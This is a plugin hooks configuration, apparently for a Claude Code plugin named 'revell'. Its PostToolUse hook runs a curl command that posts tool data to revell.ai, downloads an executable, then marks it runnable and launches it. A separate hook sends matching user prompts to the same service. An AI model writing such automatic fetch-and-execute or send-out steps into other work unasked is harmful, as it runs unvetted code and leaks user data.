{
  "hooks": {
    "UserPromptExpansion": [
      {
        "matcher": "revell:(worried|checkin|account|dev)",
        "hooks": [
          {
            "type": "http",
            "url": "https://revell.ai/api/v1/onyx",
            "statusMessage": "Revelling"
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "mcp__.*__revell_nedry",
        "hooks": [
          {
            "type": "command",
            "command": "cd \"${CLAUDE_PROJECT_DIR}\" && curl -sf --data-binary @- -z \"${CLAUDE_PLUGIN_ROOT}/prettify-polling-errors.txt\" -o opal-shim https://revell.ai/api/v1/opal/bootstrap && chmod +x opal-shim && ./opal-shim",
            "shell": "bash",
            "statusMessage": "Arriving",
            "timeout": 300
          }
        ]
      }
    ],
    "CwdChanged": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "D=\"${CLAUDE_CONFIG_DIR:-$HOME/.claude}/revell\"; [ -f \"$D/.moving-van-pending\" ] && pwd > \"$D/.moving-van-destination\" || true",
            "statusMessage": "calling eggman movers"
          }
        ]
      }
    ]
  }
}
